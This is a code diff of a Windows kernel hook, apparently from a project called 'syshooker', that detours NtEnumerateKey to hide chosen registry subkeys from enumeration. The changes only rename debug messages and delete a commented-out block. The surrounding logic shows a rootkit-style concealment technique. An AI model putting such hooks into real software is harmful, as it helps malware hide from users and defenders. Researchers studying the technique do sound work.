@@ -38,7 +38,7 @@ NTSTATUS DetourNtEnumerateKey(
 	_In_ ULONG Length,
 	_Out_ PULONG ResultLength)
 {
-	//kprintf("[+] infinityhook: NtEnumerateKey, class %d, index: %d\n", KeyInformationClass, Index);
+	//kprintf("[+] syshooker: NtEnumerateKey, class %d, index: %d\n", KeyInformationClass, Index);
 	if (KeyInformationClass == 0) {
 		// check if the handle contains any keys that should be hidden
 		ULONG HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
@@ -52,7 +52,7 @@ NTSTATUS DetourNtEnumerateKey(
 			return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
 		}
 
-		//kprintf("[+] infinityhook: NtEnumerateKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
+		//kprintf("[+] syshooker: NtEnumerateKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
 		
 		// there are keys that should be hidden. That means that we want to return
 		// the Index'th subkey of this key (OkSubkeyIndexesPtr[Index])
@@ -73,24 +73,4 @@ NTSTATUS DetourNtEnumerateKey(
 
 	}
 	else return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
-	//else if (KeyInformationClass == 4) {
-	//	NTSTATUS status = OriginalNtEnumerateKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
-	//	if (NT_SUCCESS(status)) {
-	//		kprintf("[+] infinityhook: NtEnumerateKey, class %d, after successful call, ResultLength: %d\n", KeyInformationClass, *ResultLength);
-	//		PKEY_CACHED_INFORMATION KeyCachedInformationPtr = (PKEY_CACHED_INFORMATION)KeyInformation;
-	//		kprintf("[+] infinityhook: NtEnumerateKey: SubKeys: %ul, MaxNameLen: %ul, Values: %ul, NameLength: %ul\n", KeyCachedInformationPtr->SubKeys, KeyCachedInformationPtr->MaxNameLen, KeyCachedInformationPtr->Values, KeyCachedInformationPtr->NameLength);
-
-	//		/*wchar_t NameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-	//		for (size_t i = 0; i < KeyNameInformationPtr->NameLength && i < MAX_PATH_SYSHOOKER; ++i) {
-	//			NameBuffer[i] = KeyNameInformationPtr->Name[i];
-	//		}
-	//		kprintf("[+] infinityhook: NtEnumerateKey: Name: %ws\n", NameBuffer);*/
-	//	}
-	//	return status;
-	//}
-	//else {
-	//	//kprintf("[+] infinityhook: In Detoured NtEnumerateKey, class: %d\n", KeyInformationClass);
-	//	// call the original
-	//	//return OriginalNtEnumerateKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
-	//}
 }
